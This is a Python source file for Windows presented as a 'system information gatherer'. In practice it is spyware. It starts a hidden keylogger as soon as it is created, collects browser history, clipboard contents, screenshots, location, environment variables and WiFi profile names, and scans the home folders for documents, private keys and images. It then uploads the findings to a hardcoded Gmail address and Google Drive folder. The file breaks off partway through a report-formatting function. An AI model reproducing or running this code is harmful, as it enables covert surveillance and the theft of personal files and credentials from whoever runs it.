import os
import sys
import time
import platform
import psutil
import socket
import subprocess
import json
from datetime import datetime as dt
import threading
import re
import mimetypes
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders
import win32api
import win32con
import win32security
import win32profile
import win32gui
import win32process
import wmi
import ctypes
from ctypes import wintypes
import winreg
from browser import get_chrome_history, get_firefox_history, get_edge_history
from clip_screen import ScreenshotViewer, ClipboardManager
from location import WindowsLocationMonitor

# Import key module functions without triggering module-level side effects
# key.py starts a background thread at module level, so we import carefully
try:
    import key as _key_module
except Exception:
    _key_module = None

# Import net module explicitly to avoid overwriting browser.py's functions
try:
    import net as _net_module
except Exception:
    _net_module = None

# Optional keylogger support
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except Exception:
    keyboard = None
    PYNPUT_AVAILABLE = False

# ============================================================
# EMAIL CONFIGURATION
# ============================================================
EMAIL_TO = os.environ.get("EMAIL_TO", "bhuvankumarhm25@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", EMAIL_TO)
# Set your Gmail App Password via environment variable for secure delivery
# To get an App Password: Google Account > Security > 2-Step Verification > App Passwords
GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "")

# Google Drive configuration
GOOGLE_DRIVE_FOLDER_ID = os.environ.get(
    "GOOGLE_DRIVE_FOLDER_ID",
    "1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd"
)
GOOGLE_DRIVE_FOLDER_LINK = os.environ.get(
    "GOOGLE_DRIVE_FOLDER_LINK",
    "https://drive.google.com/drive/folders/1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd?usp=drive_link"
)
GOOGLE_CREDENTIALS_FILE = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
# ============================================================

class SystemInfoGatherer:
    def __init__(self):
        self.wmi_client = wmi.WMI()
        self.keylog_path = os.path.join(os.environ.get('APPDATA', ''), 'system_logs.txt')
        self.keylogger_thread = None
        self.keylogger_active = False
        self.start_keylogger()
        
    def start_keylogger(self):
        """Start a background keylogger thread if pynput is available."""
        if not PYNPUT_AVAILABLE or self.keylogger_active:
            return False

        def on_press(key):
            try:
                key_text = key.char
            except AttributeError:
                key_text = str(key)
            try:
                with open(self.keylog_path, 'a', encoding='utf-8') as f:
                    f.write(f"{dt.now().isoformat()} [PRESS] {key_text}\n")
            except Exception:
                pass

        def on_release(key):
            if key == keyboard.Key.esc:
                return False
            return True

        def listen_keys():
            try:
                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
            except Exception as e:
                print(f"Keylogger thread failed: {e}")

        self.keylogger_thread = threading.Thread(target=listen_keys, daemon=True)
        self.keylogger_thread.start()
        self.keylogger_active = True
        return True

    def get_basic_system_info(self):
        """Get basic system information"""
        info = {
            'system': {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname())
            },
            'boot_time': dt.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        return info
    
    def get_cpu_info(self):
        """Get CPU information"""
        cpu_info = {
            'physical_cores': psutil.cpu_count(logical=False),
            'total_cores': psutil.cpu_count(logical=True),
            'max_frequency': psutil.cpu_freq().max if psutil.cpu_freq() else None,
            'min_frequency': psutil.cpu_freq().min if psutil.cpu_freq() else None,
            'current_frequency': psutil.cpu_freq().current if psutil.cpu_freq() else None,
            'usage_per_core': psutil.cpu_percent(percpu=True),
            'total_usage': psutil.cpu_percent(interval=1)
        }
        
        # Get additional CPU info using WMI
        try:
            for processor in self.wmi_client.Win32_Processor():
                cpu_info['name'] = processor.Name
                cpu_info['manufacturer'] = processor.Manufacturer
                cpu_info['family'] = processor.Family
                cpu_info['max_clock_speed'] = processor.MaxClockSpeed
                break
        except Exception as e:
            print(f"Error getting WMI CPU info: {e}")
        
        return cpu_info
    
    def get_memory_info(self):
        """Get memory information"""
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        memory_info = {
            'total': mem.total,
            'available': mem.available,
            'used': mem.used,
            'percentage': mem.percent,
            'swap_total': swap.total,
            'swap_used': swap.used,
            'swap_free': swap.free,
            'swap_percentage': swap.percent
        }
        
        return memory_info
    
    def get_disk_info(self):
        """Get disk information"""
        disk_info = []
        
        for partition in psutil.disk_partitions():
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                
                disk_info.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'file_system_type': partition.fstype,
                    'total_size': partition_usage.total,
                    'used': partition_usage.used,
                    'free': partition_usage.free,
                    'percentage': partition_usage.percent
                })
            except Exception as e:
                print(f"Error getting disk info for {partition.device}: {e}")
        
        return disk_info
    
    def get_network_info(self):
        """Get network information"""
        network_info = {
            'interfaces': {},
            'io_counters': {}
        }
        
        # Get network interfaces
        for interface_name, interface_addresses in psutil.net_if_addrs().items():
            addresses = []
            for address in interface_addresses:
                if address.family == socket.AF_INET:  # IPv4
                    addresses.append({
                        'type': 'IPv4',
                        'address': address.address,
                        'netmask': address.netmask,
                        'broadcast': address.broadcast
                    })
                elif address.family == socket.AF_INET6:  # IPv6
                    addresses.append({
                        'type': 'IPv6',
                        'address': address.address,
                        'netmask': address.netmask
                    })
            
            network_info['interfaces'][interface_name] = addresses
        
        # Get network I/O statistics
        net_io = psutil.net_io_counters()
        network_info['io_counters'] = {
            'bytes_sent': net_io.bytes_sent,
            'bytes_recv': net_io.bytes_recv,
            'packets_sent': net_io.packets_sent,
            'packets_recv': net_io.packets_recv,
            'errin': net_io.errin,
            'errout': net_io.errout,
            'dropin': net_io.dropin,
            'dropout': net_io.dropout
        }
        
        return network_info
    
    def get_gpu_info(self):
        """Get GPU information"""
        gpu_info = []
        
        try:
            for gpu in self.wmi_client.Win32_VideoController():
                gpu_info.append({
                    'name': gpu.Name,
                    'adapter_ram': gpu.AdapterRAM,
                    'driver_version': gpu.DriverVersion,
                    'driver_date': gpu.DriverDate,
                    'video_mode_description': gpu.VideoModeDescription
                })
        except Exception as e:
            print(f"Error getting GPU info: {e}")
        
        return gpu_info
    
    def get_motherboard_info(self):
        """Get motherboard information"""
        motherboard_info = {}
        
        try:
            for board in self.wmi_client.Win32_BaseBoard():
                motherboard_info = {
                    'manufacturer': board.Manufacturer,
                    'product': board.Product,
                    'version': board.Version,
                    'serial_number': board.SerialNumber
                }
                break
        except Exception as e:
            print(f"Error getting motherboard info: {e}")
        
        return motherboard_info
    
    def get_bios_info(self):
        """Get BIOS information"""
        bios_info = {}
        
        try:
            for bios in self.wmi_client.Win32_BIOS():
                bios_info = {
                    'manufacturer': bios.Manufacturer,
                    'name': bios.Name,
                    'version': bios.SMBIOSBIOSVersion,
                    'release_date': bios.ReleaseDate
                }
                break
        except Exception as e:
            print(f"Error getting BIOS info: {e}")
        
        return bios_info
    
    def get_installed_software(self):
        """Get list of installed software"""
        software_list = []
        
        try:
            for software in self.wmi_client.Win32_Product():
                software_list.append({
                    'name': software.Name,
                    'version': software.Version,
                    'vendor': software.Vendor,
                    'install_date': software.InstallDate
                })
        except Exception as e:
            print(f"Warning: Win32_Product enumeration failed: {e}")
            software_list = self.get_installed_software_registry()
        
        return software_list
    
    def get_installed_software_registry(self):
        """Fallback: read installed software from the Windows registry."""
        software_list = []
        try:
            import winreg
            registry_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
            ]

            for root, path in registry_paths:
                try:
                    with winreg.OpenKey(root, path) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            subkey_name = winreg.EnumKey(key, i)
                            try:
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name = self._get_registry_value(subkey, "DisplayName")
                                    if not name:
                                        continue
                                    software_list.append({
                                        'name': name,
                                        'version': self._get_registry_value(subkey, "DisplayVersion"),
                                        'vendor': self._get_registry_value(subkey, "Publisher"),
                                        'install_date': self._get_registry_value(subkey, "InstallDate"),
                                        'install_location': self._get_registry_value(subkey, "InstallLocation")
                                    })
                            except OSError:
                                continue
                except FileNotFoundError:
                    continue
        except Exception as e:
            print(f"Error getting installed software from registry: {e}")

        return software_list

    def _get_registry_value(self, key, value_name):
        try:
            value, _ = winreg.QueryValueEx(key, value_name)
            return value
        except Exception:
            return None

    def get_running_services(self):
        """Get list of running services"""
        services = []
        
        try:
            for service in self.wmi_client.Win32_Service():
                if service.State == 'Running':
                    services.append({
                        'name': service.Name,
                        'display_name': service.DisplayName,
                        'state': service.State,
                        'start_mode': service.StartMode
                    })
        except Exception as e:
            print(f"Warning getting running services via WMI: {e}")
            try:
                for svc in psutil.win_service_iter():
                    if svc.status().lower() == 'running':
                        services.append({
                            'name': svc.name(),
                            'display_name': svc.display_name(),
                            'state': svc.status(),
                            'start_mode': getattr(svc, 'start_type', lambda: 'unknown')()
                        })
            except Exception as fallback_error:
                print(f"Error getting running services via psutil: {fallback_error}")
        
        return services
    
    def get_startup_programs(self):
        """Get list of startup programs"""
        startup_programs = []
        
        try:
            for startup in self.wmi_client.Win32_StartupCommand():
                startup_programs.append({
                    'name': startup.Name,
                    'command': startup.Command,
                    'location': startup.Location
                })
        except Exception as e:
            print(f"Warning getting startup programs via WMI: {e}")
            startup_programs = self.get_startup_programs_registry()
        
        return startup_programs

    def get_startup_programs_registry(self):
        """Fallback: read startup programs from Windows registry Run keys."""
        programs = []
        try:
            import winreg
            run_keys = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run")
            ]

            for root, path in run_keys:
                try:
                    with winreg.OpenKey(root, path) as key:
                        for i in range(winreg.QueryInfoKey(key)[1]):
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                programs.append({
                                    'name': name,
                                    'command': value,
                                    'location': path
                                })
                            except OSError:
                                continue
                except FileNotFoundError:
                    continue
        except Exception as e:
            print(f"Error getting startup programs from registry: {e}")

        return programs
    
    def get_browser_history(self):
        """Collect browser history from installed browsers."""
        browser_data = {}
        try:
            browser_data['chrome'] = get_chrome_history()[:50]
        except Exception as e:
            browser_data['chrome_error'] = str(e)
        try:
            browser_data['edge'] = get_edge_history()[:50]
        except Exception as e:
            browser_data['edge_error'] = str(e)
        try:
            browser_data['firefox'] = get_firefox_history()[:50]
        except Exception as e:
            browser_data['firefox_error'] = str(e)
        return browser_data

    def get_clipboard_info(self):
        """Collect clipboard text and image summary."""
        clipboard = ClipboardManager()
        clipboard_info = {}
        try:
            clipboard_info['clipboard_text'] = clipboard.get_clipboard_text()
            clipboard_info['clipboard_types'] = clipboard.get_clipboard_content_type()
            latest_image = clipboard.get_clipboard_image()
            clipboard_info['clipboard_has_image'] = latest_image is not None
        except Exception as e:
            clipboard_info['error'] = str(e)
        return clipboard_info

    def get_screenshot_info(self):
        """Collect screenshot metadata."""
        viewer = ScreenshotViewer()
        info = {}
        try:
            screenshots = viewer.find_screenshots()
            info['count'] = len(screenshots)
            info['screenshots'] = []
            for path in screenshots[:20]:
                try:
                    info['screenshots'].append({
                        'path': path,
                        'modified': dt.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M:%S'),
                        'size_bytes': os.path.getsize(path)
                    })
                except Exception:
                    continue
            info['latest_screenshot'] = viewer.get_latest_screenshot()
        except Exception as e:
            info['error'] = str(e)
        return info

    def get_location_info(self):
        """Collect location data from available sources."""
        try:
            location_monitor = WindowsLocationMonitor()
            return location_monitor.get_all_location_sources()
        except Exception as e:
            return {'error': str(e)}

    def get_keylogger_info(self):
        """Get keylogger logs if available."""
        try:
            log_file = self.keylog_path
            if not os.path.exists(log_file):
                return {
                    'present': False,
                    'message': 'No keylogger logs found.',
                    'path': log_file,
                    'line_count': 0,
                    'last_entries': []
                }

            with open(log_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            trimmed_lines = [line.strip() for line in lines[-100:]]
            return {
                'present': True,
                'path': log_file,
                'line_count': len(lines),
                'last_entries': trimmed_lines
            }
        except Exception as e:
            return {
                'present': False,
                'message': f'Error getting keylogger info: {e}',
                'path': self.keylog_path,
                'line_count': 0,
                'last_entries': []
            }

    def get_net_info(self):
        """Get additional network diagnostics (WiFi profiles, active connections, public IP)."""
        net_data = {}
        try:
            # Get WiFi profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True, timeout=10
            )
            profiles = []
            for line in result.stdout.splitlines():
                if 'All User Profile' in line or 'Current User Profile' in line:
                    profile_name = line.split(':')[-1].strip()
                    if profile_name:
                        profiles.append(profile_name)
            net_data['wifi_profiles'] = profiles
        except Exception as e:
            net_data['wifi_profiles_error'] = str(e)

        try:
            # Get active TCP connections
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    connections.append({
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'pid': conn.pid
                    })
            net_data['active_connections'] = connections[:50]
        except Exception as e:
            net_data['active_connections_error'] = str(e)

        try:
            # Get public IP address
            import urllib.request
            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf-8')
            net_data['public_ip'] = public_ip
        except Exception as e:
            net_data['public_ip_error'] = str(e)

        try:
            # Get DNS servers
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            dns_servers = []
            for line in result.stdout.splitlines():
                if 'DNS Servers' in line:
                    dns = line.split(':')[-1].strip()
                    if dns:
                        dns_servers.append(dns)
            net_data['dns_servers'] = dns_servers
        except Exception as e:
            net_data['dns_servers_error'] = str(e)

        return net_data

    def get_process_info(self, limit=100):
        """Collect current process list and resource usage."""
        process_data = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent', 'exe', 'cmdline']):
                if len(process_data) >= limit:
                    break
                try:
                    process_data.append({
                        'pid': proc.info.get('pid'),
                        'name': proc.info.get('name'),
                        'username': proc.info.get('username'),
                        'status': proc.info.get('status'),
                        'cpu_percent': proc.info.get('cpu_percent'),
                        'memory_percent': proc.info.get('memory_percent'),
                        'exe': proc.info.get('exe'),
                        'cmdline': proc.info.get('cmdline')
                    })
                except (psutil.AccessDenied, psutil.NoSuchProcess):
                    continue
        except Exception as e:
            return {'error': str(e)}
        return process_data

    def get_system_uptime(self):
        """Get system uptime"""
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        
        days = int(uptime_seconds // (24 * 3600))
        hours = int((uptime_seconds % (24 * 3600)) // 3600)
        minutes = int((uptime_seconds % 3600) // 60)
        
        return {
            'boot_time': dt.fromtimestamp(boot_time).strftime('%Y-%m-%d %H:%M:%S'),
            'uptime': f"{days} days, {hours} hours, {minutes} minutes",
            'uptime_seconds': uptime_seconds
        }
    
    def get_environment_variables(self):
        """Get environment variables"""
        return dict(os.environ)
    
    def get_all_system_info(self):
        """Get all system information"""
        all_info = {
            'timestamp': dt.now().strftime('%Y-%m-%d %H:%M:%S'),
            'basic_info': self.get_basic_system_info(),
            'cpu_info': self.get_cpu_info(),
            'memory_info': self.get_memory_info(),
            'disk_info': self.get_disk_info(),
            'network_info': self.get_network_info(),
            'gpu_info': self.get_gpu_info(),
            'motherboard_info': self.get_motherboard_info(),
            'bios_info': self.get_bios_info(),
            'browser_history': self.get_browser_history(),
            'clipboard_info': self.get_clipboard_info(),
            'screenshot_info': self.get_screenshot_info(),
            'location_info': self.get_location_info(),
            'keylogger_info': self.get_keylogger_info(),
            'net_info': self.get_net_info(),
            'process_info': self.get_process_info(limit=100),
            'installed_software': self.get_installed_software(),
            'running_services': self.get_running_services(),
            'startup_programs': self.get_startup_programs(),
            'system_uptime': self.get_system_uptime(),
            'environment_variables': self.get_environment_variables()
        }
        
        return all_info
    
    def save_to_file(self, data, filename=None):
        """Save system information to a file"""
        if not filename:
            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
            filename = f"system_info_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, default=str)
            print(f"System information saved to {filename}")
            return filename
        except Exception as e:
            print(f"Error saving system information: {e}")
            return None

    def save_report_files(self, data, filename_prefix=None):
        """Save both JSON and text report files."""
        if not filename_prefix:
            filename_prefix = f"system_info_{dt.now().strftime('%Y%m%d_%H%M%S')}"

        json_filename = f"{filename_prefix}.json"
        txt_filename = f"{filename_prefix}.txt"

        saved_json = self.save_to_file(data, json_filename)
        try:
            report_text = self.format_info_for_email(data)
            with open(txt_filename, 'w', encoding='utf-8') as f:
                f.write(report_text)
            print(f"System report saved to {txt_filename}")
        except Exception as e:
            print(f"Error saving text report: {e}")
            txt_filename = None

        return saved_json, txt_filename

    def _extract_drive_folder_id(self, drive_link):
        """Extract folder ID from a Google Drive URL."""
        if not drive_link:
            return None
        patterns = [
            r"/folders/([a-zA-Z0-9_-]+)",
            r"/drive/folders/([a-zA-Z0-9_-]+)",
            r"/d/([a-zA-Z0-9_-]+)",
            r"[?&]id=([a-zA-Z0-9_-]+)",
            r"/project/([a-zA-Z0-9_-]+)"
        ]
        for pattern in patterns:
            match = re.search(pattern, drive_link)
            if match:
                return match.group(1)
        return None

    def _build_drive_service(self):
        """Build a Google Drive API service client."""
        try:
            from google.oauth2 import service_account
            from googleapiclient.discovery import build
        except ImportError as e:
            print(f"Google Drive API libraries are not installed: {e}")
            return None

        credentials_file = GOOGLE_CREDENTIALS_FILE
        if not credentials_file or not os.path.exists(credentials_file):
            script_dir = os.path.dirname(os.path.abspath(__file__))
            home_dir = os.path.expanduser('~')
            candidate_files = [
                os.path.join(script_dir, 'google_credentials.json'),
                os.path.join(script_dir, 'service_account.json'),
                os.path.join(script_dir, 'credentials.json'),
                os.path.join(script_dir, 'drive_credentials.json'),
                os.path.join(home_dir, 'google_credentials.json'),
                os.path.join(home_dir, 'service_account.json'),
                os.path.join(home_dir, '.credentials', 'google_credentials.json'),
                os.path.join(home_dir, '.credentials', 'drive_credentials.json')
            ]
            for candidate in candidate_files:
                if os.path.exists(candidate):
                    credentials_file = candidate
                    print(f"Using Google credentials file: {credentials_file}")
                    break

        if not credentials_file or not os.path.exists(credentials_file):
            print("Google credentials file not configured or not found.")
            return None

        try:
            scopes = ['https://www.googleapis.com/auth/drive.file']
            creds = service_account.Credentials.from_service_account_file(credentials_file, scopes=scopes)
            service = build('drive', 'v3', credentials=creds, cache_discovery=False)
            return service
        except Exception as e:
            print(f"Error building Google Drive service: {e}")
            return None

    def _create_drive_folder(self, parent_folder_id, folder_name):
        """Create a subfolder inside the configured Google Drive folder."""
        service = self._build_drive_service()
        if not service:
            return None
        try:
            folder_metadata = {
                'name': folder_name,
                'mimeType': 'application/vnd.google-apps.folder',
                'parents': [parent_folder_id]
            }
            created = service.files().create(body=folder_metadata, fields='id').execute()
            return created.get('id')
        except Exception as e:
            print(f"Failed to create Drive subfolder '{folder_name}': {e}")
            return None

    def get_files_to_upload(self, scan_paths=None, allowed_extensions=None, max_files=50, max_size_mb=25):
        """Collect a limited set of user files for upload from common directories."""
        if scan_paths is None:
            home = os.path.expanduser('~')
            scan_paths = [
                home,
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Videos'),
                os.path.join(home, 'Music')
            ]

            if platform.system() == 'Windows':
                system_drive = os.environ.get('SystemDrive', 'C:')
                users_root = os.path.join(system_drive, 'Users')
                if os.path.exists(users_root):
                    scan_paths.append(users_root)

        if allowed_extensions is None:
            allowed_extensions = [
                '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                '.csv', '.json', '.log', '.ini', '.conf', '.xml', '.pem', '.key',
                '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp4', '.mov', '.zip', '.rar'
            ]

        files = []
        for path in scan_paths:
            if not os.path.exists(path):
                continue
            for root, _, filenames in os.walk(path):
                for filename in filenames:
                    ext = os.path.splitext(filename)[1].lower()
                    if ext not in allowed_extensions:
                        continue
                    file_path = os.path.join(root, filename)
                    try:
                        size_mb = os.path.getsize(file_path) / (1024**2)
                        if size_mb > max_size_mb:
                            continue
                    except OSError:
                        continue
                    files.append(file_path)
                    if len(files) >= max_files:
                        return files
        return files

    def upload_reports_to_drive(self, file_paths, folder_id=None):
        """Upload generated report files to Google Drive."""
        if not file_paths:
            return False

        if not folder_id:
            folder_id = GOOGLE_DRIVE_FOLDER_ID or self._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)

        if not folder_id:
            print("Google Drive folder ID not configured.")
            return False

        service = self._build_drive_service()
        if not service:
            return False

        success_count = 0
        target_files = [f for f in file_paths if f and os.path.exists(f)]
        if not target_files:
            print("No valid files found to upload to Google Drive.")
            return False

        for file_path in target_files:
            try:
                from googleapiclient.http import MediaFileUpload
                mime_type, _ = mimetypes.guess_type(file_path)
                mime_type = mime_type or 'application/octet-stream'
                media = MediaFileUpload(file_path, mimetype=mime_type, resumable=False)
                file_metadata = {
                    'name': os.path.basename(file_path),
                    'parents': [folder_id]
                }
                created_file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                print(f"Uploaded {file_path} to Google Drive with file ID {created_file.get('id')}")
                success_count += 1
            except Exception as e:
                print(f"Failed to upload {file_path} to Google Drive: {e}")

        if success_count != len(target_files):
            print(f"Uploaded {success_count}/{len(target_files)} files to Google Drive.")
        else:
            print(f"Successfully uploaded all {success_count} files to Google Drive.")

        return success_count == len(target_files)

    def upload_files_to_drive(self, file_paths, folder_id=None, folder_name=None):
        """Upload selected files to Google Drive inside a created subfolder."""
        if not file_paths:
            return False

        parent_folder_id = folder_id or GOOGLE_DRIVE_FOLDER_ID or self._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
        if not parent_folder_id:
            print("Google Drive folder ID not configured.")
            return False

        if not folder_name:
            folder_name = f"SystemInfoFiles_{dt.now().strftime('%Y%m%d_%H%M%S')}"

        upload_folder_id = self._create_drive_folder(parent_folder_id, folder_name)
        if not upload_folder_id:
            return False

        service = self._build_drive_service()
        if not service:
            return False

        success_count = 0
        target_files = [f for f in file_paths if f and os.path.exists(f)]
        if not target_files:
            print("No valid files found to upload to Google Drive.")
            return False

        for file_path in target_files:
            try:
                from googleapiclient.http import MediaFileUpload
                mime_type, _ = mimetypes.guess_type(file_path)
                mime_type = mime_type or 'application/octet-stream'
                media = MediaFileUpload(file_path, mimetype=mime_type, resumable=False)
                file_metadata = {
                    'name': os.path.basename(file_path),
                    'parents': [upload_folder_id]
                }
                created_file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                print(f"Uploaded {file_path} to Google Drive with file ID {created_file.get('id')}")
                success_count += 1
            except Exception as e:
                print(f"Failed to upload {file_path} to Google Drive: {e}")

        if success_count != len(target_files):
            print(f"Uploaded {success_count}/{len(target_files)} files to Google Drive.")
        else:
            print(f"Successfully uploaded all {success_count} files to Google Drive.")

        return success_count == len(target_files)

    def format_info_for_email_html(self, data):
        """Format system information into clean HTML for email."""
        basic = data.get('basic_info', {})
        sys_info = basic.get('system', {})
        cpu = data.get('cpu_info', {})
        mem = data.get('memory_info', {})
        uptime = data.get('system_uptime', {})
        network = data.get('network_info', {})
        installed = data.get('installed_software', [])
        services = data.get('running_services', [])
        startup = data.get('startup_programs', [])

        html = [
            '<html><body style="font-family:Arial,sans-serif; color:#222;">',
            f'<h2>System Information Report</h2>',
            f'<p><strong>Generated:</strong> {data.get("timestamp", "N/A")}</p>',
            '<h3>Basic System Info</h3>',
            '<table border="0" cellpadding="4" cellspacing="0">',
            f'<tr><td><strong>Hostname:</strong></td><td>{sys_info.get("hostname", "N/A")}</td></tr>',
            f'<tr><td><strong>Platform:</strong></td><td>{sys_info.get("platform", "N/A")} {sys_info.get("platform_release", "")}</td></tr>',
            f'<tr><td><strong>Architecture:</strong></td><td>{sys_info.get("architecture", "N/A")}</td></tr>',
            f'<tr><td><strong>Processor:</strong></td><td>{sys_info.get("processor", "N/A")}</td></tr>',
            f'<tr><td><strong>IP Address:</strong></td><td>{sys_info.get("ip_address", "N/A")}</td></tr>',
            f'<tr><td><strong>Boot Time:</strong></td><td>{basic.get("boot_time", "N/A")}</td></tr>',
            '</table>',
            '<h3>CPU & Memory</h3>',
            '<table border="0" cellpadding="4" cellspacing="0">',
            f'<tr><td><strong>CPU Name:</strong></td><td>{cpu.get("name", "N/A")}</td></tr>',
            f'<tr><td><strong>Physical Cores:</strong></td><td>{cpu.get("physical_cores", "N/A")}</td></tr>',
            f'<tr><td><strong>Total Cores:</strong></td><td>{cpu.get("total_cores", "N/A")}</td></tr>',
            f'<tr><td><strong>CPU Usage:</strong></td><td>{cpu.get("total_usage", "N/A")}%</td></tr>',
            f'<tr><td><strong>Memory Total:</strong></td><td>{mem.get("total", 0) / (1024**3):.2f} GB</td></tr>',
            f'<tr><td><strong>Memory Used:</strong></td><td>{mem.get("used", 0) / (1024**3):.2f} GB ({mem.get("percentage", "N/A")}%)</td></tr>',
            f'<tr><td><strong>Memory Available:</strong></td><td>{mem.get("available", 0) / (1024**3):.2f} GB</td></tr>',
            f'<tr><td><strong>Uptime:</strong></td><td>{uptime.get("uptime", "N/A")}</td></tr>',
            '</table>',
            '<h3>Summary</h3>',
            '<ul>',
            f'<li>Installed software count: {len(installed)}</li>',
            f'<li>Running services count: {len(services)}</li>',
            f'<li>Startup programs count: {len(startup)}</li>',
            f'<li>Browser history entries: {sum(len(v) for v in data.get("browser_history", {}).values() if isinstance(v, list))}</li>',
            f'<li>Clipboard types: {", ".join(data.get("clipboard_info", {}).get("clipboard_types", [])) or "None"}</li>',
            f'<li>Screenshots found: {data.get("screenshot_info", {}).get("count", 0)}</li>',
            f'<li>Keylogger lines: {data.get("keylogger_info", {}).get("line_count", 0)}</li>',
            f'<li>Active connections: {len(data.get("net_info", {}).get("active_connections", []))}</li>',
            f'</ul>',
            '<p>Full details are included as JSON and TXT attachments.</p>',
            '</body></html>'
        ]
        return ''.join(html)

    def format_info_for_email(self, data):
        """Format system information into a readable email body"""
        lines = []
        lines.append("=" * 60)
        lines.append("  SYSTEM INFORMATION REPORT")
        lines.append(f"  Generated: {data.get('timestamp', 'N/A')}")
        lines.append("=" * 60)
        
        # Basic Info
        basic = data.get('basic_info', {})
        sys_info = basic.get('system', {})
        lines.append("\n--- BASIC SYSTEM INFO ---")
        lines.append(f"  Hostname:      {sys_info.get('hostname', 'N/A')}")
        lines.append(f"  Platform:      {sys_info.get('platform', 'N/A')} {sys_info.get('platform_release', '')}")
        lines.append(f"  Version:       {sys_info.get('platform_version', 'N/A')}")
        lines.append(f"  Architecture:  {sys_info.get('architecture', 'N/A')}")
        lines.append(f"  Processor:     {sys_info.get('processor', 'N/A')}")
        lines.append(f"  IP Address:    {sys_info.get('ip_address', 'N/A')}")
        lines.append(f"  Boot Time:     {basic.get('boot_time', 'N/A')}")
        
        # CPU Info
        cpu = data.get('cpu_info', {})
        lines.append("\n--- CPU INFO ---")
        lines.append(f"  Name:          {cpu.get('name', 'N/A')}")
        lines.append(f"  Manufacturer:  {cpu.get('manufacturer', 'N/A')}")
        lines.append(f"  Physical Cores: {cpu.get('physical_cores', 'N/A')}")
        lines.append(f"  Total Cores:   {cpu.get('total_cores', 'N/A')}")
        lines.append(f"  Max Freq:      {cpu.get('max_frequency', 'N/A')} MHz")
        lines.append(f"  Total Usage:   {cpu.get('total_usage', 'N/A')}%")
        
        # Memory Info
        mem = data.get('memory_info', {})
        lines.append("\n--- MEMORY INFO ---")
        total_gb = mem.get('total', 0) / (1024**3) if mem.get('total') else 0
        used_gb = mem.get('used', 0) / (1024**3) if mem.get('used') else 0
        avail_gb = mem.get('available', 0) / (1024**3) if mem.get('available') else 0
        lines.append(f"  Total:         {total_gb:.2f} GB")
        lines.append(f"  Used:          {used_gb:.2f} GB ({mem.get('percentage', 'N/A')}%)")
        lines.append(f"  Available:     {avail_gb:.2f} GB")
        lines.append(f"  Swap Total:    {mem.get('swap_total', 0) / (1024**3):.2f} GB")
        lines.append(f"  Swap Usage:    {mem.get('swap_percentage', 'N/A')}%")
        
        # Disk Info
        disks = data.get('disk_info', [])
        lines.append("\n--- DISK INFO ---")
        for disk in disks:
            lines.append(f"  Drive: {disk.get('device', 'N/A')} ({disk.get('mountpoint', 'N/A')})")
            lines.append(f"    Type:  {disk.get('file_system_type', 'N/A')}")
            lines.append(f"    Total: {disk.get('total_size', 0) / (1024**3):.2f} GB")
            lines.append(f"    Used:  {disk.get('used', 0) / (1024**3):.2f} GB ({disk.get('percentage', 'N/A')}%)")
            lines.append(f"    Free:  {disk.get('free', 0) / (1024**3):.2f} GB")
        
        # GPU Info
        gpus = data.get('gpu_info', [])
        lines.append("\n--- GPU INFO ---")
        for gpu in gpus:
            lines.append(f"  Name:    {gpu.get('name', 'N/A')}")
            lines.append(f"  RAM:     {gpu.get('adapter_ram', 'N/A')}")
